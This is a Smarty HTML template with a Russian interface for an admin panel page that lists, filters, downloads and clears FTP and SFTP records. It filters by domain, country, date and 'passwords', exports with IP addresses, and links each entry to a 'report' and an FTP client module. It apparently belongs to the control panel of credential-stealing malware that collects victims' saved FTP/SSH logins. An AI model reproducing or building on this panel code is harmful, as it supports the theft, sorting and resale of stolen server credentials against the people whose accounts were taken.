{assign var='no_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=ftp"}

{if {$smarty.request.routine|default:''} == 'confirm_clear_ftp'}
	{assign var='msg' value="Вы уверены, что хотите очистить список FTP?"}
	{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=ftp&amp;routine=clear_ftp"}
	{include file='confirm.tpl'}
{elseif {$smarty.request.routine|default:''} == 'confirm_clear_ssh'}
	{assign var='msg' value="Вы уверены, что хотите очистить список SSH (SFTP)?"}
	{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=ftp&amp;routine=clear_ssh"}
	{include file='confirm.tpl'}
{/if}

	{append var="cont_codes" value="Европа" index="EU"}
	{append var="cont_codes" value="Северная Америка" index="NA"}
	{append var="cont_codes" value="Южная Америка" index="SA"}
	{append var="cont_codes" value="Азия" index="AS"}
	{append var="cont_codes" value="Африка" index="AF"}
	{append var="cont_codes" value="Океания" index="OC"}
	{append var="cont_codes" value="Антарктика" index="AN"}
	{append var="cont_codes" value="Другие" index="--"}

	{foreach from=$cont_codes key=continent_code item=continent_name}
		{if isset($smarty.request.{"country_"|cat:{$continent_code|lower}})}
			{assign var="country_value_set" value="true"}
		{/if}
	{/foreach}

	{if $smarty.request.filter_include_ftp|default:'' != '' || $smarty.request.filter_include_ssh|default:'' != '' || $smarty.request.filter_domains_include|default:'' != '' || $smarty.request.filter_domains_exclude|default:'' != '' || isset($country_value_set) || $smarty.request.filter_date_from|default:'' != '' || $smarty.request.filter_date_to|default:'' != '' || $smarty.request.filter_text|default:'' != ''}
		<h4>Внимание! Активирован режим фильтрации. <a href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp">Отключить</a>.</h4><br />
	{/if}
	
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=download_ftp">Скачать список FTP</a><a class="download_zip" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=download_ftp&amp;zip=1"></a> (<b>{$total_ftp_items_count}</b> {$total_ftp_items_count|items})<br />
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=download_ssh">Скачать список SSH (SFTP)</a><a class="download_zip" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=download_ssh&amp;zip=1"></a> (<b>{$total_ssh_items_count}</b> {$total_ssh_items_count|items})<br />
	{if $priv_can_delete}
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=confirm_clear_ftp">Очистить список FTP</a><br />
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=ftp&amp;routine=confirm_clear_ssh">Очистить список SSH (SFTP)</a><br />
	{/if}
	<a class="filter_nav" href="#" onclick="javascript:$('#filter_frm_block').slideToggle();">Показать фильтр</a>
	{if isset($filtered_items_count)}
		{if $filtered_items_count > 0}
			(найдено <b>{$filtered_items_count}</b> {$filtered_items_count|items}, <a href="#" onclick="javascript:$('#routine').val('filter_download'); $('#filter_frm').submit(); $('#routine').val(''); return false;"><b>скачать</b></a><a class="download_zip" href="#" onclick="javascript:$('#routine').val('filter_download'); $('#zip').val('1'); $('#filter_frm').submit(); $('#routine').val(''); javascript:$('#zip').val(''); return false;"></a>)
		{else}
			(ничего не найдено)
		{/if}
	{/if}
	<br />
	<br />
	
	<div id="filter_frm_block" style="display:none;width:500px">
		<form id="filter_frm" name="filter_frm" action="" method="post">
		<input type="submit" style="position:absolute;left:-10000px;top:-10000px;" />
		<input type="hidden" name="token" value="{$token}" />
		<input type="hidden" name="routine" id="routine" value="" />
		<input type="hidden" name="zip" id="zip" value="" />
		<div id="tabs">
			<ul>
				<li><a href="#tabs-1">Фильтр</a></li>
				<li><a href="#tabs-2">Фильтр по странам</a></li>
				<li><a href="#tabs-3">Фильтр по дате</a></li>
			</ul>
			<div id="tabs-1">
				<br />

				<input type="hidden" name="action" value="ftp" />
				<p style="margin-left:10px;">Включить в список только определенные домены: <br /><input style="width:250px;" name="filter_domains_include" value="{$smarty.request.filter_domains_include|default:''}" /> <br /><small>(можно задать несколько через запятую)</small></p><br />
				<p style="margin-left:10px;">Исключить домены: <br /><input style="width:250px;" name="filter_domains_exclude" value="{$smarty.request.filter_domains_exclude|default:''}" /> <br /><small>(можно задать несколько через запятую)</small></p><br />
				<p style="margin-left:10px;">Текстовый поиск: <br /><input style="width:250px;" name="filter_text" value="{$smarty.request.filter_text|default:''}" /> <br /><small>(поиск подстроки, работает очень быстро)</small></p><br />

					<input style="margin-left:10px;" type="checkbox" id="filter_include_ftp" name="filter_include_ftp" value="1"
					{if !isset($country_value_set) || $smarty.request.filter_include_ftp|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_include_ftp"> Включить FTP</label><br />

					<input style="margin-left:10px;" type="checkbox" id="filter_include_ssh" name="filter_include_ssh" value="1"
					{if $smarty.request.filter_include_ssh|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_include_ssh"> Включить SFTP</label><br />

					<input style="margin-left:10px;" type="checkbox" id="filter_trim_dirs" name="filter_trim_dirs" value="1"
					{if $smarty.request.filter_trim_dirs|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_trim_dirs"> Исключить директории из FTP/SFTP строк</label><br />

					<input style="margin-left:10px;" type="checkbox" id="filter_export_ip" name="filter_export_ip" value="1"
					{if $smarty.request.filter_export_ip|default:'' == '1'}
						checked="checked"
					{/if}
					/><label for="filter_export_ip"> Экспортировать с IP-адресами</label><br />
					
					<br />

				<div class="buttons">
					<button class="neutral" onclick="javascript:clear_form('#filter_frm'); $(':input', '#tabs-3').val(''); reset_drop_lists(); $('#filter_include_ftp').attr('checked', 'checked'); return false;" style="width:110px;">
						<img src="includes/design/images/reset_icon.png" alt="" />
						Сбросить
					</button>
					<button class="positive" onclick="javascript:document.filter_frm.submit();" style="width:130px;">
						<img src="includes/design/images/find_icon.png" alt="" />
						Активировать
					</button>
				</div>

				<br /><br />
			</div>
			<div id="tabs-2">
				{foreach from=$cont_codes key=continent_code item=continent_name}
					<label style="display: inline; width: 150px; float: left;">
					{$continent_name}:
					</label>
					<div style="display: inline; float: left">
			        <select id="drop_{$continent_code|lower}" multiple="multiple" name="country_{$continent_code|lower}[]">
						{foreach from=$geo_continents.$continent_code item=country name=traversal}
							<option
							{if !isset($smarty.request.{"country_"|cat:{$continent_code|lower}})}
								{if !isset($country_value_set)}
									{if $smarty.foreach.traversal.index == 0} selected="selected"{/if}
								{/if}
							{else}
								{if {$country.code}|array_search:$smarty.request.{"country_"|cat:{$continent_code|lower}} !== false}
								selected="selected"
								{/if}
							{/if}
							value="{$country.code}"
							>{$country.name}</option>
						{/foreach}
			        </select>
			        </div>
			        <br />
			        <br />
				{/foreach}

				<div class="buttons">
					<button class="neutral" onclick="javascript:uncheck_drop_lists(); return false;" style="width:200px;">
						<img src="includes/design/images/reset_icon.png" alt="" />
						Очистить списки стран
					</button>
				</div>
				<br />
				<br />
			</div>
			<div id="tabs-3">
				<p style="margin-left:10px;">Включить пароли начиная со следующего дня:<br /><input type="text" style="width:260px" name="filter_date_from" id="datepicker_from" value="{$smarty.request.filter_date_from|default:''}" /></p><br />
				<p style="margin-left:10px;">Включить пароли только до следующего дня:<br /><input type="text" style="width:260px" name="filter_date_to" id="datepicker_to" value="{$smarty.request.filter_date_to|default:''}" /></p><br />
			</div>
		</div>
		</form>

		<br />
	</div>

	{if isset($filtered_items_list)}
		{assign var="ftp_list" value=$filtered_items_list}
	{/if}

	{if count($ftp_list)}
		{if isset($filtered_items_list)}
			<h4>Пример отфильтрованных FTP записей</h4>
			<table id="table_ftp" width="800" cellspacing="0" summary="FTP filter examples">
		{else}
			<h4>Последние поступления FTP</h4>
			<table id="table_ftp" width="800" cellspacing="0" summary="Latest FTP additions">
		{/if}

		<tr>
			<th width="53%">URL</th>
			<th width="27%">FTP клиент</th>
			<th width="20%">Время добавления</th>
		</tr>

		{foreach from=$ftp_list item=ftp_item}
			{assign var=img_file value="includes/design/images/modules/"|cat:$ftp_item.module|cat:".png"}
			{if file_exists($img_file)}
				{assign var=img_url value="<img style=\"margin-top:-2px;vertical-align:middle;\" src=\""|cat:$img_file|cat:"\" width=\"16\" height=\"16\" alt=\"\" /> "}
			{else}
				{assign var=img_url value=""}
			{/if}

			<tr>
			{if strlen($ftp_item.url) < 60}
			<td>
			{else}
			<td title="{$ftp_item.url}">
			{/if}
			
			{if $ftp_item.report_id != '' && $ftp_item.report_id != '0'}
				<a class="view_report" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=reports&amp;routine=view_report&amp;report_id={$ftp_item.report_id}">
					{$ftp_item.url|truncate:60:'...':true:false}
				</a>
			{else}
				{$ftp_item.url|truncate:60:'...':true:false}
			{/if}

			</td>
			<td style="padding-bottom:2px">{$img_url nofilter}{$ftp_item.ftp_client}</td>
			<td>{$ftp_item.import_time}</td>
			</tr>
		{/foreach}

		</table><br />
	{else}
		{if isset($filtered_items_list)}
			<h4>Записей соответствующих фильтру не найдено!</h4>
		{else}
			<h4>Список FTP пуст!</h4>
		{/if}
	{/if}
